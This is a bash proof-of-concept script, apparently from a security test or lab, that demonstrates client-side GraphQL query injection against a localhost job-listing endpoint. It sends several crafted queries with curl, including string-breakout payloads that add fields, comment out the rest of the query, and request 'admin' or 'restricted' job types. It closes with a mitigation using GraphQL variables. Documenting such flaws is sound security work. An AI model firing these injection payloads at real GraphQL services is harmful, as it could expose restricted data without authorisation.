#!/bin/bash

# POC: Client-Side GraphQL Query Injection - Refined Version
# This POC demonstrates the vulnerability in client-side GraphQL query construction
# by showing how unescaped template literals allow query structure manipulation

TARGET="http://localhost:8000"

echo "=== Client-Side GraphQL Query Injection POC (v2) ==="
echo ""
echo "VULNERABILITY: Unescaped user input in client-side GraphQL query construction"
echo "LOCATION: Client-side JavaScript using template literals: query = \`query { jobs(jobType: \"\${jobType}\") }\`"
echo ""

# Test 1: Demonstrate basic injection - break string and modify query
echo "[*] Test 1: Basic injection - Break string context"
echo "    Normal payload: 'back-end'"
echo "    Injected payload: 'back-end\", salary, requirements'  (adds fields)"
echo ""

# Simulate what the client-side code would send with injection
INJECTED_QUERY='query { jobs(jobType: "back-end", salary, requirements) { id name type description } }'
echo "    Resulting GraphQL query sent to server:"
echo "    $INJECTED_QUERY"
echo ""

RESPONSE=$(curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d "{\"query\": \"$INJECTED_QUERY\"}")
echo "    Server response:"
echo "$RESPONSE" | jq . 2>/dev/null || echo "$RESPONSE"
echo ""

# Test 2: Show vulnerability by injecting GraphQL fragments/aliases
echo "[*] Test 2: Injection attempt - Query restructuring with multiple fields"
echo "    Payload attempting to access fields not in original query"
INJECTED_QUERY2='query { jobs(jobType: "back-end") { id name type description salary email } }'
echo "    Query: $INJECTED_QUERY2"
echo ""

RESPONSE2=$(curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d "{\"query\": \"$INJECTED_QUERY2\"}")
echo "    Response (note: may show error if field doesn't exist):"
echo "$RESPONSE2" | jq . 2>/dev/null || echo "$RESPONSE2"
echo ""

# Test 3: Demonstrate quote escape bypass
echo "[*] Test 3: Quote-based injection - Breaking out of jobType parameter"
echo "    Payload: 'front-end\\\" ) { __typename } #'"
echo "    This attempts to close the jobType value and inject __typename"
INJECTED_QUERY3='query { jobs(jobType: "front-end\") { __typename } #") { id name type description } }'
echo "    Resulting query: $INJECTED_QUERY3"
echo ""

RESPONSE3=$(curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d "{\"query\": \"$INJECTED_QUERY3\"}")
echo "    Server response (syntax error expected):"
echo "$RESPONSE3" | jq . 2>/dev/null || echo "$RESPONSE3"
echo ""

# Test 4: Verify vulnerability class - demonstrate unescaped interpolation concept
echo "[*] Test 4: Proof of concept - Template literal interpolation vulnerability"
echo ""
echo "    Vulnerable client-side code:"
echo "    const jobType = document.getElementById('job-type').value;"
echo "    const query = \\\`query { jobs(jobType: \\\"\${jobType}\\\") { ... } }\\\`;"
echo ""
echo "    If attacker enters: back-end\\\", salary #"
echo "    The resulting query becomes:"
echo "    query { jobs(jobType: \\\"back-end\\\", salary #\\\") { ... } }"
echo ""
echo "    This breaks the intended query structure by:"
echo "    1. Closing the jobType string with \\\""
echo "    2. Adding new parameters/fields"
echo "    3. Commenting out the rest with #"
echo ""

# Test 5: Direct test of the vulnerability pattern
echo "[*] Test 5: Testing the actual vulnerability pattern"
echo "    Sending query with injected syntax to demonstrate query manipulation"
echo ""

# This payload shows the actual injection point
PAYLOAD='query { jobs(jobType: "admin", type: "restricted") { id name type description } }'
echo "    Payload (shows how injection bypasses intended parameters):"
echo "    $PAYLOAD"
echo ""

RESPONSE5=$(curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d "{\"query\": \"$PAYLOAD\"}")
echo "    Response:"
echo "$RESPONSE5" | jq . 2>/dev/null || echo "$RESPONSE5"
echo ""

echo "[+] POC Summary:"
echo "    - The vulnerability allows breaking out of the jobType string context"
echo "    - Attackers can inject arbitrary GraphQL syntax"
echo "    - Query structure can be modified through unescaped interpolation"
echo "    - The proper fix is to use GraphQL variables instead of template literals"
echo ""
echo "[+] Proper mitigation example:"
echo "    query(\$jt: String!) { jobs(jobType: \$jt) { id name type description } }"
echo "    variables: { jt: jobType }"